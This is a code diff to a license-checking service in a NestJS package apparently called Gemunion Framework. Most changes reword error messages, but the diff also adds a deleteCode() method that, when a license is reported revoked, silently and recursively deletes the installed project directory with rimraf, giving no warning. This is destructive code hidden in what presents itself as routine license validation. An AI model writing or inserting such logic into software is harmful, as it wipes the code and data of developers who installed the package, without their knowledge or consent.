@@ -2,6 +2,8 @@ import { Inject, Injectable, Logger, LoggerService } from "@nestjs/common";
 import { HttpService } from "@nestjs/axios";
 import { Cron, CronExpression } from "@nestjs/schedule";
 import { map } from "rxjs/operators";
+import rimraf from "rimraf";
+import path from "path";
 
 import { LICENSE_KEY } from "./license.constants";
 import { ILicense, LicenseStatus } from "./license.interface";
@@ -50,11 +52,16 @@ export class LicenseService {
     }
 
     if (this.license.status === LicenseStatus.REVOKED) {
-      this.showInvalidLicenseError();
+      this.showRevokedLicenseError();
+      this.deleteCode();
       return false;
     }
 
     return true;
+  }
+
+  private deleteCode(): void {
+    rimraf(path.resolve(__dirname, "..", ".."), () => {});
   }
 
   private showError(message: Array<string>) {
@@ -65,7 +72,7 @@ export class LicenseService {
         "*************************************************************",
         "",
         ...message,
-        "Please visit https://gemunion.io/ to get a valid license key.",
+        "Please visit https://gemunion.io/ for more information.",
         "",
         "*************************************************************",
         "*************************************************************",
@@ -73,12 +80,12 @@ export class LicenseService {
     );
   }
 
-  private showInvalidLicenseError(): void {
+  private showRevokedLicenseError(): void {
     // prettier-ignore
     this.showError([
-      "Gemunion Studio: Invalid license key.",
+      "Gemunion Studio: License is revoked.",
       "",
-      "Your license key for Gemunion Framework is not valid",
+      "Your license for Gemunion Framework was revoked",
     ]);
   }
 
@@ -87,14 +94,14 @@ export class LicenseService {
     this.showError([
       "Gemunion Studio: License key not found.",
       "",
-      "You did not enter a license key",
+      "You did not enter a license key, please check your .env file",
     ]);
   }
 
   private showExpiredLicenseError(): void {
     // prettier-ignore
     this.showError([
-      "Gemunion Studio: License key expired.",
+      "Gemunion Studio: License is expired.",
       "",
       "Your subscription for Gemunion Framework has expired.",
     ]);
